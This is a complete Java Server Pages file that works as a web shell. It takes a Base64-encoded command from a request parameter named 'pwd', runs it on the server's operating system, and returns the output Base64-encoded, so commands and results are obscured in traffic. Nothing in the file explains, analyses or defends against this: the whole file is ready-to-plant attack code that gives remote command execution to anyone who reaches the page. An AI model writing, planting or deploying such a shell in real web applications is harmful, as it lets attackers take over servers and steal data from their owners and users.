<%@ page language="java" contentType="text/html; charset=utf-8" pageEncoding="utf-8"%>
<%@ page import="java.io.*" %>
<%@ page import="java.net.Socket" %>
<%@ page import="com.sun.org.apache.xerces.internal.impl.dv.util.Base64" %>
<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="sun.misc.BASE64Encoder" %>
<%
    String path = request.getContextPath();
    String basepath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
	String str = request.getParameter("pwd");
	
	char[] ch = str.toCharArray();
	byte[] bt = Base64.decode(String.valueOf(ch));
	try {
		str = new String(bt,"UTF-8");
	} catch (UnsupportedEncodingException e) {
		e.printStackTrace();
	}

	String result = "";
	try {
		Process p = Runtime.getRuntime().exec(str);
		InputStreamReader ir = new InputStreamReader(p.getInputStream());
		LineNumberReader input = new LineNumberReader(ir);
		String line;
		while ((line = input.readLine()) != null) {
			result += line.concat("\r\n");
		}
		if (result.length() > 0) {
			result = result.substring(0, result.lastIndexOf("\r\n"));
		}
	} catch (IOException e) {
		e.printStackTrace();
	}


	byte[] b = null;
	try {
		b = result.getBytes("utf-8");
	} catch (Exception e) {
		e.printStackTrace();
	}
	if (b != null) {
		result = new BASE64Encoder().encode(b);
	}

	out.println(result);
%>